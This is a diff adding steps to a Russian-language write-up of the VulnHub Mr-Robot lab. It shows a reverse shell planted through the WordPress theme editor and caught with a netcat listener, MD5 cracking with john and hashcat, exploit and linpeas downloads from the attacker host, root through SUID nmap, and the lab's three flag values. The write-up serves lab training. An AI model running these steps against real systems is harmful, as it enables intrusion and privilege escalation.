@@ -367,21 +367,242 @@ ER28-0652               [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 168
 :: Progress: [11451/11451] :: Job [1/1] :: 58 req/sec :: Duration: [0:10:57] :: Errors: 13 ::
 ```
 
-Креды `elliot:20150603025145`
+Креды `elliot:ER28-0652`
 
 
 ## 📂 Получение доступа
 
+### WordPress Theme Editor
+Перехожу в редактор тем и выбираю шаблон для сообщения об ошибках (например, когда запрашивается несуществующая страница)  
+![wp_themes](screenshots/03.wp_themes.png)
 
+Вставляю в конец код реверс шелла от pentestmonkey  
+![reverse_php](screenshots/04.reverse_php.png)
+
+Теперь иду в блог, например, на `http://192.168.56.129/blog/wubbalubbadubdub` и получаю реверс
+```bash
+┌──(kali㉿0x2d-pentest)-[~]
+└─$ nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [192.168.56.106] from (UNKNOWN) [192.168.56.129] 38634
+Linux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
+ 15:23:26 up 16 min,  0 users,  load average: 0.20, 0.10, 0.07
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=1(daemon) gid=1(daemon) groups=1(daemon)
+/bin/sh: 0: can't access tty; job control turned off
+$ python -c 'import pty;pty.spawn("/bin/bash")'
+daemon@linux:/$ export TERM=xterm
+export TERM=xterm
+daemon@linux:/$ ^Z
+zsh: suspended  nc -lvnp 4444
+                                                                                                                  
+┌──(kali㉿0x2d-pentest)-[~]
+└─$ stty raw -echo; fg
+[1]  + continued  nc -lvnp 4444
+
+daemon@linux:/$ id
+uid=1(daemon) gid=1(daemon) groups=1(daemon)
+daemon@linux:/$ pwd
+/
+daemon@linux:/$
+```
 
 ## ⚙️ Привилегии
 
+Теперь нужно осмотреться
+```bash
+daemon@linux:/$ ls -la /home
+total 12
+drwxr-xr-x  3 root root 4096 Nov 13  2015 .
+drwxr-xr-x 22 root root 4096 Sep 16  2015 ..
+drwxr-xr-x  2 root root 4096 Nov 13  2015 robot
+daemon@linux:/$ cd /home/robot
+daemon@linux:/home/robot$ ls -la
+total 16
+drwxr-xr-x 2 root  root  4096 Nov 13  2015 .
+drwxr-xr-x 3 root  root  4096 Nov 13  2015 ..
+-r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
+-rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5
+daemon@linux:/home/robot$ cat key-2-of-3.txt 
+cat: key-2-of-3.txt: Permission denied
+daemon@linux:/home/robot$ cat password.raw-md5 
+robot:c3fcd3d76192e4007dfb496cca67e13b
+daemon@linux:/home/robot$ 
+```
 
+Есть пользователь `robot` и есть хеш его пароля в md5  
+На всякий случай проверяю тип хеша
+```bash
+┌──(kali㉿0x2d-pentest)-[~/Labs/VulnHub/Lin Intermediate - Mr-Robot_1/exploits]
+└─$ hashid "c3fcd3d76192e4007dfb496cca67e13b"
+Analyzing 'c3fcd3d76192e4007dfb496cca67e13b'
+[+] MD2 
+[+] MD5 
+[+] MD4 
+[+] Double MD5 
+[+] LM 
+[+] RIPEMD-128 
+[+] Haval-128 
+[+] Tiger-128 
+[+] Skein-256(128) 
+[+] Skein-512(128) 
+[+] Lotus Notes/Domino 5 
+[+] Skype 
+[+] Snefru-128 
+[+] NTLM 
+[+] Domain Cached Credentials 
+[+] Domain Cached Credentials 2 
+[+] DNSSEC(NSEC3) 
+[+] RAdmin v2.x
+```
+
+И пробую сбрутить с помощью `john` или `hashcat`  
+
+### john
+```bash
+┌──(kali㉿0x2d-pentest)-[~/Labs/VulnHub/Lin Intermediate - Mr-Robot_1/exploits]
+└─$ echo "robot:c3fcd3d76192e4007dfb496cca67e13b" > robot_hash.txt
+                                                                                                                   
+┌──(kali㉿0x2d-pentest)-[~/Labs/VulnHub/Lin Intermediate - Mr-Robot_1/exploits]
+└─$ john --format=raw-md5 robot_hash.txt
+
+┌──(kali㉿0x2d-pentest)-[~/Labs/VulnHub/Lin Intermediate - Mr-Robot_1/exploits]
+└─$ john --show --format=raw-md5 robot_hash.txt      
+robot:abcdefghijklmnopqrstuvwxyz
+```
+
+### hashcat
+```bash
+┌──(kali㉿0x2d-pentest)-[~/Labs/VulnHub/Lin Intermediate - Mr-Robot_1/exploits]
+└─$ echo "c3fcd3d76192e4007dfb496cca67e13b" > robot_hash.txt
+
+┌──(kali㉿0x2d-pentest)-[~/Labs/VulnHub/Lin Intermediate - Mr-Robot_1/exploits]
+└─$ hashcat --help | grep MD5
+      0 | MD5                                                        | Raw Hash
+
+┌──(kali㉿0x2d-pentest)-[~/Labs/VulnHub/Lin Intermediate - Mr-Robot_1/exploits]
+└─$ hashcat -m 0 -a 0 robot_hash.txt /media/sf_Exchange/Dictionaries/rockyou.txt
+
+┌──(kali㉿0x2d-pentest)-[~/Labs/VulnHub/Lin Intermediate - Mr-Robot_1/exploits]
+└─$ hashcat -m 0 -a 0 robot_hash.txt --show                                     
+c3fcd3d76192e4007dfb496cca67e13b:abcdefghijklmnopqrstuvwxyz
+```
+
+Повышаюсь до `robot` и читаю второй ключ
+```bash
+daemon@linux:/home/robot$ su robot
+Password: 
+robot@linux:~$ id
+uid=1002(robot) gid=1002(robot) groups=1002(robot)
+robot@linux:~$ cat key-2-of-3.txt 
+822c73956184f694993bede3eb39f959
+robot@linux:~$ 
+```
+
+### linpeas
+Скачиваю `linpeas.sh` и запускаю
+```bash
+robot@linux:~$ cd /tmp
+robot@linux:/tmp$ sudo -l                                                                                          
+[sudo] password for robot:                                                                                         
+Sorry, try again.  
+robot@linux:/tmp$ which wget
+/usr/bin/wget
+robot@linux:/tmp$ wget http://192.168.56.106:8888/linpeas.sh -O peas.sh
+robot@linux:/tmp$ chmod +x peas.sh
+robot@linux:/tmp$ ./peas.sh
+```
+
+Смотрю информацию
+```bash
+                               ╔═══════════════════╗
+═══════════════════════════════╣ Basic information ╠═══════════════════════════════                                
+                               ╚═══════════════════╝                                                               
+OS: Linux version 3.13.0-55-generic (buildd@brownie) (gcc version 4.8.2 (Ubuntu 4.8.2-19ubuntu1) ) #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015
+User & Groups: uid=1002(robot) gid=1002(robot) groups=1002(robot)
+Hostname: linux
+```
+
+И есть с ходу уязвимость ядра `3.13.0-55-generic`
+```bash
+                              ╔════════════════════╗
+══════════════════════════════╣ System Information ╠══════════════════════════════                                 
+                              ╚════════════════════╝                                                               
+╔══════════╣ Operative system
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#kernel-exploits                  
+Linux version 3.13.0-55-generic (buildd@brownie) (gcc version 4.8.2 (Ubuntu 4.8.2-19ubuntu1) ) #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015
+Distributor ID: Ubuntu
+Description:    Ubuntu 14.04.2 LTS
+Release:        14.04
+Codename:       trusty
+```
+
+Скачиваю эксплоит
+![privesc](screenshots/05.privesc.png)
+
+И эксплоит не отрабатывает
+```bash
+robot@linux:/tmp$ wget http://192.168.56.106:8888/priv.c
+robot@linux:/tmp$ gcc priv.c -o priv
+robot@linux:/tmp$ ./priv
+spawning threads
+mount #1
+mount #2
+child threads done
+exploit failed
+robot@linux:/tmp$
+```
+
+Пока листал вывод `linpeas`, увидел ещё один 95% вектор `SUID`
+```bash
+                      ╔════════════════════════════════════╗
+══════════════════════╣ Files with Interesting Permissions ╠══════════════════════                                 
+                      ╚════════════════════════════════════╝                                                       
+╔══════════╣ SUID - Check easy privesc, exploits and write perms
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid                    
+strace Not Found                                                                                                   
+...
+-rwsr-xr-x 1 root root 493K Nov 13  2015 /usr/local/bin/nmap
+```
+
+Перехожу на `gtfobins`  
+![privesc_nmap](screenshots/06.privesc_nmap.png)  
+
+Привилегии с помощью `SUID` в `nmap` можно повысить, например, через режим `--interactive` или через `--script`
+
+### --script
+```bash
+nmap --script="os.execute('/bin/sh')"
+```
+но на жертве установлена старая версия, не поддерживающая `--script`
+
+### --interactive
+```bash
+robot@linux:/tmp$ nmap --interactive
+nmap> !sh
+# id
+uid=1002(robot) gid=1002(robot) euid=0(root) groups=0(root),1002(robot)
+# cd /root
+# ls -la
+total 32
+drwx------  3 root root 4096 Nov 13  2015 .
+drwxr-xr-x 22 root root 4096 Sep 16  2015 ..
+-rw-------  1 root root 4058 Nov 14  2015 .bash_history
+-rw-r--r--  1 root root 3274 Sep 16  2015 .bashrc
+drwx------  2 root root 4096 Nov 13  2015 .cache
+-rw-r--r--  1 root root    0 Nov 13  2015 firstboot_done
+-r--------  1 root root   33 Nov 13  2015 key-3-of-3.txt
+-rw-r--r--  1 root root  140 Feb 20  2014 .profile
+-rw-------  1 root root 1024 Sep 16  2015 .rnd
+# cat key-3-of-3.txt
+04787ddef27c3dee1ee161b21670b4e4
+```
 
 ## 🏁 Флаги
 
-- User flag: 
-- Root flag: 
+- key 1: 073403c8a58a1f80d943455fb30724b9
+- key 2: 822c73956184f694993bede3eb39f959   
+- key 3: 04787ddef27c3dee1ee161b21670b4e4  
 
 ---
 
